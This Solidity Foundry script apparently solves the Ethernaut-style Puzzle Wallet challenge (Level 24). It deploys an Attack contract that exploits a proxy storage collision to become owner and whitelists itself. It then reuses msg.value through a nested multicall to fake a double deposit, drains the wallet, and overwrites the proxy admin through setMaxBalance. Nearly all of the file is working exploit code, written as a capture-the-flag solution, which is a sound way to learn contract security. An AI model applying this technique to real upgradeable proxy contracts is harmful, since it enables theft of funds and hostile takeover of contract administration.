// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "../src/Level24.sol";

contract Level24Sol is Script {
    PuzzleProxy public proxy =
        PuzzleProxy(payable(0x5415eC6D56a799978BdEd9166328De045f52366D));
    PuzzleWallet public wallet =
        PuzzleWallet(0x5415eC6D56a799978BdEd9166328De045f52366D);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        console.log("Wallet Owner  :", wallet.owner());
        console.log("Proxy Admin :", proxy.admin());
        console.log("Wallet Max Balance : ", wallet.maxBalance());
        console.log("Proxy Pending Admin : ", proxy.pendingAdmin());
        console.log("Wallet balance : ", address(wallet).balance);

        Attack attack = new Attack();

        attack.exploit{value: 0.001 ether}();

        console.log("Wallet Owner  :", wallet.owner());
        console.log("Proxy Admin :", proxy.admin());
        console.log("Wallet Max Balance : ", wallet.maxBalance());
        console.log("Proxy Pending Admin : ", proxy.pendingAdmin());
        console.log("Wallet balance : ", address(wallet).balance);

        vm.stopBroadcast();
    }
}

contract Attack {
    PuzzleProxy public proxy =
        PuzzleProxy(payable(0x5415eC6D56a799978BdEd9166328De045f52366D));
    PuzzleWallet public wallet =
        PuzzleWallet(0x5415eC6D56a799978BdEd9166328De045f52366D);

    function exploit() public payable {
        proxy.proposeNewAdmin(address(this));

        wallet.addToWhitelist(address(this));

        bytes[] memory _depositData = new bytes[](1);
        _depositData[0] = abi.encodeWithSelector(wallet.deposit.selector);

        bytes[] memory data = new bytes[](2);
        data[0] = _depositData[0];
        data[1] = abi.encodeWithSelector(
            wallet.multicall.selector,
            _depositData
        ); // nested multicalling

        wallet.multicall{value: 0.001 ether}(data);

        wallet.execute(address(this), 0.002 ether, "");

        wallet.setMaxBalance(
            uint256(
                uint160(address(0x2e118e720e4142E75fC79a0f57745Af650d39F94))
            )
        );
    }

    receive() external payable {}
}
